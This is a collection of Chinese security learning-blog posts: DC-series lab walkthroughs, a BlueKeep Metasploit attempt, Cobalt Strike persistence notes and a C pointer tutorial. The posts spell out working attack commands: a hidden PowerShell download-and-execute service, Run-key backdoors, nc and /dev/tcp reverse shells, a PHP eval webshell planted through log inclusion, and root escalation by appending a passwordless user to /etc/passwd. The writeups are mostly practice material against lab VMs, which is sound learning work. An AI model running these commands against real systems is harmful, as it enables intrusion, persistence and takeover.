<p>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce或者偷点懒直接use 1（序号）</p>
<p>set rhosts 192.168.87.131<br>set payload windows/x64/meterpreter/reverse_tcp<br>set targets 2（如果win7虚拟机装在VMware上就选2，也有人说3也可以，不太懂。问题也出在这里）</p>
<p>set lhost 192.168.87.130</p>
<p>run</p>
<p> <img src="1503868-20200621130230033-452260458.png" alt loading="lazy"></p>
<p> 很离谱，shell获取不到，找不到适合的targets</p>
<p>一直这样子。要么蓝屏，要么没反应</p>
<img src="1503868-20200621154334259-229021170.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>　</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Cobalt Strike权限维持</title>
    <url>/2020/10/03/Cobalt%20Strike%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13763667.html">源地址：https://www.cnblogs.com/This-is-Y/p/13763667.html<i class="fas fa-external-link-alt"></i></a></p>
<p>比较菜，目前需要上线的目标是system权限</p>
<p>1、sc创建自启动服务</p>
<p>以下命令都是在cs中执行的，在cmd中测试只需要删掉前面的shell就行</p>
<p>先创建一个服务（需要system权限）</p>
<p>shell sc create “shell” binpath= “cmd /c start powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(‘<a class="link" href="http://192.168.123.54/%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6&#39;))\&quot;&quot;">http://192.168.123.54/后门文件&#39;))\&quot;&quot;<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20201003101057792-1730825120.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 因为是拿自己的电脑测试的，直接用win+r启动services.msc来查看服务状态确认一下，此时还是手动的。</p>
<img src="1503868-20201003101330081-319574120.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 设置自启动</p>
<p>shell sc config “shell” start= auto</p>
<p>设置描述</p>
<p>shell sc description “shell” “shell persistence”</p>
<p>启动服务</p>
<p>shell net start “shell”</p>
<p>删除服务</p>
<p>shell sc delete “shell”</p>
<p> </p>
<p>如果没有公网IP，也可以上传一个免杀后门到目标上，也是使用sc配置一个自启动服务来进行权限维持　　</p>
<p>sc create “shell_local” binpath= “C:\Users\Public\BypassAV.exe（文件路径）”</p>
<p>sc description “shell_local” “shell_local_persistence”</p>
<p>sc config “shell_local” start= auto</p>
<p>net start “shell_local”</p>
<p> </p>
<p>2、注册表自启动</p>
<p>同样需要先需要上传一个免杀后门</p>
<p>命令shell reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit” /t REG_SZ /d “C:\Users\Public\BypassAV.exe（文件路径）” /f</p>
<p>要删除也简单shell reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v “shell_regedit”</p>
<img src="1503868-20201003104333155-300830107.png" alt loading="lazy">

<p> 当然、也可以采用插件</p>
<p><a class="link" href="https://github.com/ZonkSec/persistence-aggressor-script">https://github.com/ZonkSec/persistence-aggressor-script<i class="fas fa-external-link-alt"></i></a></p>
<p><br> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>C语言指针再回顾</title>
    <url>/2020/03/05/C%E8%AF%AD%E8%A8%80%E6%8C%87%E9%92%88%E5%86%8D%E5%9B%9E%E9%A1%BE-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12417028.html">源地址：https://www.cnblogs.com/This-is-Y/p/12417028.html<i class="fas fa-external-link-alt"></i></a></p>
<p><strong>内存</strong></p>
<p>C语言内存四区：代码区，全局区，栈区，堆区</p>
<p>代码区：存放代码的</p>
<p>全局区：用于存放全局变量和静态变量， 里面细分有一个常量区，字符串常量和其他常量也存放在此。该区域是在程序结束后由操作系统释放。</p>
<p>栈区：由系统自动开辟，系统自动释放，并不大。</p>
<p>堆区：程序员动态开辟的内存，由我们手动开辟，手动释放，非常大。链表，数据结构，动态数组，动态结构体与此相关。</p>
<p><strong>地址</strong></p>
<p>一个字节8位，内存以单个字节位单位分开，每个字节有一个<strong>不可修改</strong>的<strong>连续</strong>的<strong>唯一</strong>的编号，这个编号就是地址。就像酒店里的房间。一个一个的房间就是一个一个字节，编号，也就是地址，就是门牌号，而且是刻在房间门上的，不可修改。</p>
<p>每个在代码里的变量都有地址，用取地址运算符：&amp; （单目运算符，优先级仅低于“（）”，从右往左）来获取地址。</p>
<p><strong>首地址</strong></p>
<p>一段内存空间中，<strong>第一个存储单元</strong>的地址。如定于一个int a，占用内存中4个字节，首地址就是这四个字节中，第一个字节的地址。如图：</p>
<img src="1503868-20200304192329614-245727354.png" alt width="525" height="251">

<p> </p>
<p> </p>
<p> 第二个数组的首地址是他的第一个存储单元，也就是a[0]的地址，实际上a[0]的首地址就是他的第一个字节的首地址，数值上看是一样的，但是意义并不同</p>
<p><strong>指针变量</strong></p>
<p>地址如上所说，是一种编号，是一种数据。用来存放地址的变量，</p>
<p>内存大小位4B（4个字节）</p>
<p>整数 int a;</p>
<p>字符 char b;</p>
<p>小数 float c;</p>
<p>地址  指针变量</p>
<p>指针变量的定义：指针变量不是单独存在的，是相对与其他数据类型来的，比如整形指针变量 int *p;，字符型指针变量 char *p; 。</p>
<p>　　 int <em>p;//指明一个指针变量，存的数据为地址。int表明存放的<strong>地址</strong>指向的<strong>内存空间</strong>里面存放的<strong>数据类型</strong>是int。</em>表明p这个变量是指针变量。这个指针变量名字就叫做p(不是*p)。其他的类型(char,float,……）相同</p>
<p>指针变量的赋值：</p>
<p>加入a的地址是1001，此时p中存的是a的地址，即1001，称p指向a</p>
<p>指针变量的引用：接上一条的代码，访问a的值。可以直接用a来访问，如一条printf语句，当然这里说指针，看到要用指针来访问，就像第二条printf语句。</p>
<img src="1503868-20200304195504407-2131474534.png" alt width="432" height="132">

<p> </p>
<p>指针访问：<em>指针变量（</em>为取值运算符，单目运算符，从右到左）（在定义指针变量时，<em>只是表明后面接的变量是一个指针变量。在未定义时出现的</em>，表示为取值运算符。</p>
<p> </p>
<p>野指针：不能明确指向的指针变量 ，当一个指针变量指向一个为定义的变量时，这个指针变量就是野指针。（很危险！！！！有可能在未知情况下操作意料之外的数据）</p>
<p>解决部分，定义该指针为NULL，即内存中的第一个字节的地址，0</p>
<p>空指针：空指针相对于int*,float*,char*,等，空指针为void*，不知道指向什么样子的内存，比如一个4个字节的内存，可以存int，long等类型的数据，未确定时，使用void，当确定下来后，可以强制把void转化需要的类型。在后期动态内存分配，用到malloc等函数时用得更多</p>
<p> </p>
<p> </p>
<p><strong>指针的运算</strong></p>
<p>只有4个，+， -， ++， –</p>
<p>单纯指针加减没有意义，主要是为了指针偏移。指针变量的加减，以指针所指向的类型空间为单位进行偏移。如</p>
<img src="1503868-20200304203301771-315667024.png" alt width="453" height="212">

<p> </p>
<p> </p>
<p>从数据类型的知识可以知道，在64位windows操作系统中，int占用4个字节，char占用1个字节。 从结果中可以看到，pi+1后，指针的值比之前加了4，而pc+1后，指针的值比之前加了1。（16进制数字加减）</p>
<p> </p>
<p> </p>
<p><strong>首地址：一段内存空间中第一个存储单元的地址，存储单元。</strong></p>
<p><strong>指针变量的加减：以指针所指向的类型空间位单位进行偏移。</strong></p>
<p><strong>一维数组和指针：</strong></p>
<p>**　　1.定义一个一维数组。数组中的元素依次存放，数组名是这个数组的‘首地址**</p>
<p><strong>先定义一个数组int a[10]</strong></p>
<p><strong>a指向a[0] ，a[0] 的类型是int，所以a是int*类型。</strong></p>
<p><strong>a[0]这个地址指向a[0] int(*)[10]元素，字节为4，</strong></p>
<p><strong>&amp;a这个执行整个数组。</strong></p>
<p><strong>如下，数组长度为10。</strong></p>
<p><strong>第一个a+1比a增加了4，</strong></p>
<p><strong>第二个&amp;a+1比&amp;a增加了40（4x10）</strong></p>
<p> </p>
<p> </p>
<img src="1503868-20200304205608787-117557920.png" alt width="439" height="122">

<p> </p>
<p>访问数组元素：</p>
<p>普通下标法：最常见，最基础的，</p>
<p>指针法： 可以使用以下几种，建议<em>p++,<em>单目运算符优先级比+双目运算符优先级高，建议加一个’（）‘。同时也可以使用</em>(a+i)来调用数组元素。此时不能用</em>a++。a是数组名，a++会改变a 。数组名不能改变</p>
<p> </p>
<p> </p>
<p><strong>二维数组与指针：</strong></p>
<p><strong>数组名是这个数组的首地址</strong></p>
<p><strong>首地址是一段内容中第一个存储单元</strong></p>
<p><strong>定义一个二维数组int a[3][4],在我们看来，这是一个3x4的矩阵，然鹅在计算机中，依然是线性的，此时</strong></p>
<p><strong>a指向a[0]这个一维数组，类型为int(*)[4]， a+1一次加16B</strong></p>
<p><strong>&amp;a指向整个二维数组，类型为int(*)[3][4]</strong></p>
<p><em><em>a[0]指向a[0][0]这个int ，类型为int</em> a[0]+1一次加4B</em>*</p>
<p><strong>&amp;a[0]指向a[0]这个一维数组，类型为int(*)[4]  (a=&amp;a[0])</strong></p>
<p><strong>二维数组取值</strong></p>
<p><strong>下表法：a[m][n]</strong></p>
<p><em><em>指针法：</em>(a[m]+n)</em>*</p>
<p>**　　　　<em>(</em>(a+m)+n)****　　(a先偏移到m行数组，再用<em>往下走一层，再偏移n个位置，走到a[m][n]的位置，再用一个</em>取这个地址的值）**</p>
<p>** **</p>
<p><strong>多维数组：</strong></p>
<p>**　　从高到低一步一步走下去，**</p>
<p>**　　假设一个5维数组 a[][][][][]**</p>
<p>**　　变量名　　　　　　　　类型**</p>
<p>**　　a　　　　　　　　　　 int(<em>)[][][][]</em>*</p>
<p>**　　a[0]   　　　　　　　 int(<em>)[][][]<br></em>*</p>
<p>**　　a[0][0]　　　　　　　 int(<em>)[][]</em>*</p>
<p>**　　a[0][0][0]　　　　　　int(<em>)[]</em>*</p>
<p>**　　<strong>a[0][0][0][0]　　　　 int***</strong></p>
<p>**　　<strong>a[0][0][0][0][0]      int**</strong></p>
<p>**　　**</p>
<p><strong><strong>　善用*的取值和走向下一层和&amp;的取地址功能，明白首地址的意义。可以很快理解各种奇奇怪怪的指针。</strong></strong></p>
<p> </p>
<p> </p>
<p>**　　<strong>注意区分</strong>int*<strong>*这种**多级指针</strong>和<strong>int*[]<strong>这种</strong>数组指针</strong>以及<em><em>int</em>[]<strong>这种</strong>指针数组</em>*的区别，同是还有函数指针，结构体指针，字符串与指针，指针形参的函数，</p>
<p> </p>
<p>　　这里我统称他们为自闭指针</p>
<p>**　**</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>** **</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>DC-2 靶机</title>
    <url>/2020/06/28/DC-2%20%E9%9D%B6%E6%9C%BA-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13203455.html">源地址：https://www.cnblogs.com/This-is-Y/p/13203455.html<i class="fas fa-external-link-alt"></i></a></p>
<p>配置好vmbox网络环境，运行DC2靶机</p>
<p>打开kali，改用桥接模式。可以ping通物理机，可以上网。</p>
<p>用nmap扫描存活主机</p>
<p>nmap -sP 192.168.123.0/24</p>
<img src="1503868-20200628152208271-533964091.png" alt loading="lazy">

<p> 可以看到有DC-2，DC-3（这是我另外开的，暂时不用管）</p>
<p>DC-2靶机ip：192.168.123.57</p>
<p> </p>
<p>得到了靶机ip，根据制作者提示，在windows下host文件中加入 </p>
<p>192.168.123.57 dc-2</p>
<p>用于DNS解析</p>
<p>打开dc-2</p>
<img src="1503868-20200628154558018-221801633.png" width="1000" loading="lazy">

<p> </p>
<p>提示我们要用字典，cewl，应该是后台爆破</p>
<p>用dirsearch 爆破后台</p>
<img src="1503868-20200628155003138-860036943.png" width="1000" loading="lazy">

<p> </p>
<p> 回到kali，用cewl生成字典</p>
<p>直接在kali下用cewl是用没用的，因为kali下访问dc-2得不到任何结果，需要配置kali下的hosts文件，</p>
<p>vim /etc/hosts</p>
<img src="1503868-20200628155810899-1613282049.png" alt loading="lazy">

<p> :wq保存退出，浏览器访问dc-2正常表示配置成功</p>
<p>然后开始使用cewl获取网页信息同时生成字典</p>
<p>根据提示，我们通过cewl获得的应该只是密码字典，要登陆后台，还需要用户名。</p>
<p>发现在忘记密码这里没有做验证码，而且当填写admin和其他乱七八糟数据时，回显不同（填写admin，直接跳转了，其他的则是提示<strong>ERROR</strong>: Invalid username or email.）考虑从忘记密码这里爆破获取可用用户名</p>
<p>打开bp，抓包，添加参数，导入字典。</p>
<p> <img src="1503868-20200628161501976-1473739774.png" alt loading="lazy"></p>
<p> </p>
<p> 这里我用的<a class="link" href="https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names">github上的一个字典<i class="fas fa-external-link-alt"></i></a>，70kb的username，1w+条数据。等他跑一会。</p>
<p>等了差不多10来分钟，跑出的结果有3个：</p>
<p>admin</p>
<p>jerry</p>
<p>tom</p>
<p>。。。。tom，jerry？？！！</p>
<img src="1503868-20200628165854911-408749608.jpg" alt loading="lazy">

<p> </p>
<p> </p>
<p> <img src="1503868-20200628165857501-880201027.jpg" alt loading="lazy"></p>
<img src="1503868-20200628164318178-1334289903.png" alt loading="lazy">

<p>再分别对这3个用户爆破密码</p>
<p>admin爆破失败</p>
<p>tom：parturient</p>
<p>jerry：adipiscing</p>
<img src="1503868-20200628165937274-2045012683.png" width="1000" loading="lazy">

<p> </p>
<p> 用jerry登陆到后台，找了找，发现flag2</p>
<img src="1503868-20200628171821434-1423694220.png" width="1000" loading="lazy">

<p> </p>
<p> 这个只有jerry账户里面有，登陆tom可以看到page，但是打不开</p>
<img src="1503868-20200628172204258-2048291702.png" alt loading="lazy">

<p> 根据flag的提示，应该要我们从别的地方突破</p>
<p>这里我卡住了，看别人的博客发现。用</p>
<p>nmap -sS -p- 192.168.123.57</p>
<p>可以扫出80，7744端口（我在这里卡住是因为我nmap就扫出来一个80端口，得好好再学学nmap了）</p>
<img src="1503868-20200628200801736-1637018596.png" alt loading="lazy">

<p> </p>
<p> 这里显示的服务看不懂，再用nmap扫一下确认服务</p>
<p>nmap -sV -p 7744 192.168.123.57</p>
<img src="1503868-20200628200937767-1295816569.png" alt loading="lazy">

<p> </p>
<p> ssh。这应该就是flag说的另一个突破口了</p>
<p> 用jerry账户连接，被阻止</p>
<img src="1503868-20200628201529792-694956156.png" alt loading="lazy">

<p> </p>
<p> 用tom连接，可以连接，目录下有一个flag3.txt文件，但是提示command not found</p>
<img src="1503868-20200628201613334-1099460565.png" alt loading="lazy">

<p> 提示-rbash，受限制的bash</p>
<p>参考<a class="link" href="https://blog.csdn.net/qq_38677814/article/details/80003851">这个：https://blog.csdn.net/qq_38677814/article/details/80003851<i class="fas fa-external-link-alt"></i></a></p>
<p>解决了cat的问题</p>
<p>BASH_CMDS[a]=/bin/sh;a</p>
<p>export PATH=$PATH:/bin/</p>
<p>export PATH=$PATH:/usr/bin</p>
<img src="1503868-20200715200949671-876939956.png" alt loading="lazy">

<p> </p>
<p> flag3.txt:  Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.（可怜的老汤姆总是追着杰瑞跑。也许他应该为他造成的所有压力辩护）<br>su，提到了这个</p>
<p>继续在这个shell下操作，su jerry</p>
<p>然后就切换到了jerry</p>
<img src="1503868-20200715201748549-18632348.png" width="800" loading="lazy">

<p> </p>
<p> 但是想要ls的时候，提示说被禁止</p>
<p>cd ../..退出一下就好了</p>
<p>cat一下flag4.txt</p>
<img src="1503868-20200715202248120-1883659899.png" alt loading="lazy">

<p> </p>
<p> 提示让我们git </p>
<p>百度查了查，git -p help和git help config然后搭配!/bin/bash都试过了，没用。</p>
<p>然后看攻略，，发现我忽略了一个sudo，</p>
<p>正确提权姿势</p>
<p>sudo git help config</p>
<p>然后直接输入!/bin/bash</p>
<p>出来就变成root了</p>
<img src="1503868-20200715204742386-737572022.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 学习点：</p>
<p>1、cewl生成字典</p>
<p>2、nmap的使用（-p-）要不是不会这个，也不至于找不到端口，卡死在ssh连接上</p>
<p>3、suid提权</p>
<p>4、git提权</p>
<p>5、bash这一块有关知识</p>
<p>6、sudo</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>DC-4靶机</title>
    <url>/2020/07/22/DC-4%E9%9D%B6%E6%9C%BA-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13347213.html">源地址：https://www.cnblogs.com/This-is-Y/p/13347213.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://www.five86.com/dc-4.html">下载<i class="fas fa-external-link-alt"></i></a>，安装（vmware直接导入文件），桥接</p>
<p>kali开始nmap扫描</p>
<p>nmap -sP 192.168.123.0/24</p>
<img src="1503868-20200719164434709-620316570.png" alt loading="lazy">

<p>找到目标ip：192.168.123.9</p>
<p>浏览器访问，就一个登陆页面</p>
<img src="1503868-20200719164509154-76924117.png" width="1000" loading="lazy">

<p> </p>
<p> nmap扫描端口；只有22和80</p>
<p>可以确定是linux了（废话）</p>
<img src="1503868-20200722101755939-1486713193.png" alt loading="lazy">

<p> 再dirsearch扫描目录</p>
<img src="1503868-20200719164921773-715340004.png" width="1000" loading="lazy">

<p> 也没有有用的信息</p>
<p>先试试注入，手注和sqlmap都没找出什么来</p>
<p> </p>
<p>burp抓包跑字典暴力破解再试试看</p>
<img src="1503868-20200722083839127-1750061235.png" alt loading="lazy">

<p> 暴力破解出了结果</p>
<p>admin</p>
<p>happy</p>
<p>登陆后的页面，</p>
<img src="1503868-20200722083915861-231379410.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 只有一个command，点进去，有3个命令供执行</p>
<p>ls -l    显示目录内容列表</p>
<p>du -h      显示每个文件和目录的磁盘使用情况</p>
<p>df -h   显示磁盘相关信息</p>
<img src="1503868-20200722084039243-1322324194.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 试试抓包，执行命令作为明文参数，修改成别的，发现也可以执行（这里我是换成了dir）</p>
<img src="1503868-20200722084926019-1762086525.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> 验证其可行性后，试试看别的命令，cat command.php</p>
<p>可以看到执行命令的是这个shell_exec()函数</p>
<img src="1503868-20200722085951661-107414924.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 用户是www-data，权限组在33</p>
<p>没有写文件的权限</p>
<p>直接<a class="link" href="https://choge.top/2020/02/23/%E5%8F%8D%E5%BC%B9shell%E8%84%9A%E6%9C%AC%E6%94%B6%E9%9B%86/">反弹shell<i class="fas fa-external-link-alt"></i></a></p>
<img src="1503868-20200722092238878-1679955723.png" width="1000" loading="lazy">

<p> </p>
<p> </p>
<p> 看上去像是把命令里的&amp;符当成分隔符了。编码一下就解决了</p>
<p> bash+-i+&gt;%26%2Fdev%2Ftcp%2F192.168.123.42%2F1234+0&gt;%261<br>然鹅还是反弹不出来，看不到报错，也不知道是什么的原因</p>
<p>换nc反弹</p>
<p>nc 192.168.123.41 1234 -e /bin/bash</p>
<p>反弹成功</p>
<img src="1503868-20200722095309079-1344845192.png" alt loading="lazy">

<p>查看是否有可用于suid提权的文件</p>
<p>find / -user root -perm -4000 -print 2&gt;/dev/null</p>
<img src="1503868-20200722101241845-1809258723.png" alt loading="lazy">

<p>没找到</p>
<p>sudo也用不了</p>
<p> uname -a和lsb_release -a查看系统版本</p>
<img src="1503868-20200722101110053-1570558000.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 去sploitdb里面找是否有可以用的漏洞</p>
<p> 有一些关于ssh的漏洞，但是在反弹回来的shell下，我没有权限wget下载文件</p>
<p> </p>
<p>看了一些别人的博客，到/home目录下，有三个用户</p>
<img src="1503868-20200722103655965-1633930654.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 但是只有jim下面有文件</p>
<p> backups里面有一个oldpasswd.bak，是一些密码，估计是要爆破</p>
<p>mbox打不开，没有权限</p>
<p>test.sh文件内容像是提示</p>
<img src="1503868-20200722104744291-1768662936.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 先尝试爆破</p>
<p>把oldpasswords.bak中的数据保存下来（jim.txt)</p>
<p>再使用hydra进行爆破</p>
<p>　hydra -l jim -P jim.txt 192.168.123.9 ssh<br><br>不到半分钟就出来了</p>
<img src="1503868-20200722105446312-1994701178.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 密码：jibril04<br>通过ssh登陆jim</p>
<p>查看mbox文件内容</p>
<img src="1503868-20200722105625407-610577568.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> 看内容是一封邮件</p>
<p>从jim这边查找文件，再var/mail下看到一封jim的邮件，打开</p>
<img src="1503868-20200722112546396-1552346468.png" alt loading="lazy">

<p> </p>
<p> 得到了用户charles的密码^xHhA&amp;hvim0y<br>试着登陆一下</p>
<img src="1503868-20200722112713063-2099022073.png" alt loading="lazy">

<p> </p>
<p> 成功</p>
<p>跟着这个思路，回到www-data,查看www-data文件，</p>
<img src="1503868-20200722113021374-1393808338.png" alt loading="lazy">

<p> </p>
<p> 有很多封邮件，但是都没用</p>
<p>登陆到charles后，可以使用sudo</p>
<p>用sudo -l看一下，命令teehee不需要密码就可以执行，用</p>
<p>echo “admin::0:0:::/bin/bash” | sudo teehee -a /etc/passwd</p>
<p>在passwd下面添加一个没有密码的root用户，</p>
<p>然后就可以在/root下找到flag了</p>
<img src="1503868-20200722225054047-631918545.png" alt loading="lazy">

<p> </p>
<p> </p>
<p> </p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>DC-5</title>
    <url>/2021/06/07/DC-5-This-is-Y/</url>
    <content><![CDATA[<p>虚拟机用的NAT模式，看一下自己NAT的网卡的段<br><img src="image-20210607154654661.png" alt="image-20210607154654661"></p>
<p>nmap找IP</p>
<ul>
<li>nmap 192.168.87.0/24 -sP<br><img src="image-20210607154727829.png" alt="image-20210607154727829"></li>
</ul>
<p>nmap扫一下端口</p>
<ul>
<li>nmap -Pn -sV 192.168.87.132</li>
</ul>
<p>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    nginx 1.6.2<br>111/tcp open  rpcbind 2-4 (RPC #100000)</p>
<p>太少了<br>再用masscan扫一下</p>
<ul>
<li>masscan -p0-65535 192.168.87.132<br>Discovered open port 57216/tcp on 192.168.87.132<br>Discovered open port 80/tcp on 192.168.87.132<br>Discovered open port 111/tcp on 192.168.87.132<br>没东西</li>
</ul>
<p>同时dirsearch扫一下目录</p>
<ul>
<li>python .\dirsearch.py -u <a class="link" href="http://192.168.87.132/">http://192.168.87.132/<i class="fas fa-external-link-alt"></i></a> -e php</li>
</ul>
<p>[15:50:10] Starting:<br>[15:50:24] 200 -    4KB - /contact.php<br>[15:50:24] 301 -  184B  - /css  -&gt;  <a class="link" href="http://192.168.87.132/css/">http://192.168.87.132/css/<i class="fas fa-external-link-alt"></i></a><br>[15:50:26] 200 -    6KB - /faq.php<br>[15:50:27] 301 -  184B  - /images  -&gt;  <a class="link" href="http://192.168.87.132/images/">http://192.168.87.132/images/<i class="fas fa-external-link-alt"></i></a><br>[15:50:27] 403 -  570B  - /images/<br>[15:50:27] 200 -    4KB - /index.php<br>[15:50:36] 200 -  852B  - /thankyou.php</p>
<p>Task Completed</p>
<p>xray扫出了这个<img src="image-20210607161522204.png" alt="image-20210607161522204"><br>暂时用不上</p>
<p>去看了一下作者的视频提示<br><img src="image-20210607164231823.png" alt="image-20210607164231823"></p>
<p><a class="link" href="https://www.five86.com/dc-5-clue.html">https://www.five86.com/dc-5-clue.html<i class="fas fa-external-link-alt"></i></a><br>有个文件包含<br><a class="link" href="http://192.168.87.132/thankyou.php?file=/etc/passwd">http://192.168.87.132/thankyou.php?file=/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
<p>后面改了一下网卡，ip变成了192.168.101.128</p>
<p>后续getshell思路是，执行<br>192.168.101.128/thankyou.php?<?php eval(@$_POST['a']); ?><br>在nginx中它会被记录到log日志中，日志有两种，正确的和错误的<br>文件路径分别为<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>在读取的是时候两个都试试，</p>
<p>192.168.101.128/thankyou.php?file=/var/log/nginx/error.log<br>192.168.101.128/thankyou.php?file=/var/log/nginx/access.log</p>
<p>error的连不上，<br>用access这个连上去了，但是练上去后我人就傻了</p>
<p><img src="image-20210607222211828.png" alt="image-20210607222211828"><br>这™的是什么</p>
<p>（蚁剑的问题，更新一下就好了）</p>
<p>注意写数据到日志的时候要用bp，直接浏览器写会进行编码，导致数据解析不出来</p>
<p>蚁剑连进去后，看一下各种信息，反弹shell到kali</p>
<p>监听 nc -lvvp 4567</p>
<p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc 192.168.101.130 4567 &gt;/tmp/bd</p>
<p><img src="image-20210608102329776.png" alt="image-20210608102329776"></p>
<p><img src="image-20210608102323166.png" alt="image-20210608102323166"></p>
<p>准备提权<br>nginx1.6.2有个提权的漏洞<br>CVE-2016-1247<br>但是用不了</p>
<p><img src="image-20210608111816674.png" alt="image-20210608111816674"><br>少了权限</p>
<p>用 find / -perm -u=s -type f 2&gt;/dev/null  查找一下可以用root权限运行的命令</p>
<p>找到了screen这个，去searchsploit里找到了相应的利用文件</p>
<p><img src="image-20210608150840541.png" alt="image-20210608150840541"></p>
<p>把文件下载过来上传到目标/tmp目录里，直接用发现不太行</p>
<p>直接对着文件内容，一步一步过来</p>
<p><img src="image-20210608151059369.png" alt="image-20210608151059369"></p>
<p><img src="image-20210608151222329.png" alt="image-20210608151222329"></p>
<p><img src="image-20210608150655806.png" alt="image-20210608150655806"></p>
]]></content>
  </entry>
  <entry>
    <title>DC-6</title>
    <url>/2021/06/08/DC-6-This-is-Y/</url>
    <content><![CDATA[<p>dc-6<br>安装作者的说明，下载hosts文件中配置一下</p>
<pre><code>#DC-6
192.168.101.133 wordy
</code></pre>
<p><img src="image-20210608174641928.png" alt="image-20210608174641928"></p>
<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>访问，是用wordpress写的，先拿wpscan扫一下<br>不出所料，wpscan什么也没扫到</p>
<p>这边同时用dirsearch扫目录<br>找到这个，<br><a class="link" href="http://wordy/wp-includes/">http://wordy/wp-includes/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/install.php">http://wordy/wp-admin/install.php<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/maint/repair.php">http://wordy/wp-admin/maint/repair.php<i class="fas fa-external-link-alt"></i></a><br>找了一圈，无果，同样是看作者提示<br>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt<br>去kali里找到了rockyou.txt.gz这个文件，解压<br>gzip -d rockyou.txt.gz<br>然后得到了一个passwords.txt密码文件</p>
<h2 id="爆破用户后台"><a href="#爆破用户后台" class="headerlink" title="爆破用户后台"></a>爆破用户后台</h2><p>看到那条提示，应该是要爆破用户账号<br>bp找了一个1w的字典爆破了一下，</p>
<p><img src="image-20210615152408119.png" alt="image-20210615152408119"></p>
<p>graham<br>admin<br>sarah<br>mark<br>再去wpscan里爆破密码</p>
<p>wpscan –url <a class="link" href="http://wordy/">http://wordy<i class="fas fa-external-link-alt"></i></a> -U 1 -P /root/桌面/passwords.txt</p>
<p>等一会<br>出来一个</p>
<p><img src="image-20210615153223679.png" alt="image-20210615153223679"></p>
<p>mark<br>helpdesk01</p>
<p>进去可以看到少爆破了一个用户</p>
<p><img src="image-20210615153254802.png" alt="image-20210615153254802"></p>
<p>jens</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>利用它的插件activity_monitor来getshell</p>
<p><img src="image-20210615182120264.png" alt="image-20210615182120264"></p>
<p>看了一下文档，用的是个命令执行</p>
<p><a class="link" href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<i class="fas fa-external-link-alt"></i></a></p>
<p><img src="image-20210615182721023.png" alt="image-20210615182721023"></p>
<p>在这个页面选lookup，抓包</p>
<p>payload改为  g.cn | nc 192.168.101.130 1234 -e /bin/bash</p>
<p><img src="image-20210615182742027.png" alt="image-20210615182742027"></p>
<p>接收到shell</p>
<p><img src="image-20210615182956882.png" alt="image-20210615182956882"></p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>翻来找去，在mark的用户目录下找到了一个文件</p>
<p><img src="image-20210615183107032.png" alt="image-20210615183107032"></p>
<p>当时扫端口时，是有22端口的，</p>
<p><img src="image-20210615183227314.png" alt="image-20210615183227314"></p>
<p>登录graham用户</p>
<p>sudo -l</p>
<p><img src="image-20210615183650315.png" alt="image-20210615183650315"></p>
<p>顺势找到了这个文件 backups.sh,原本是用作备份网页的，<br>用 vi backups.sh 修改文件内容为 /bin/bash ，因为jens不用密码<br>然后       sudo -u jens ./backups.sh<br>就来到了jens的shell下<br>    find / -perm -u=s -type f 2&gt;/dev/null<br>没找到东西</p>
<p><img src="image-20210615185154119.png" alt="image-20210615185154119"></p>
<h3 id="nmap-提权"><a href="#nmap-提权" class="headerlink" title="nmap 提权"></a>nmap 提权</h3><p>sudo -l找到nmap可以用，用nmap提权<br>先写一个nse文件，root.nse<br>    os.execute(‘/bin/bash’)<br>然后sudo nmap –script=root.nse</p>
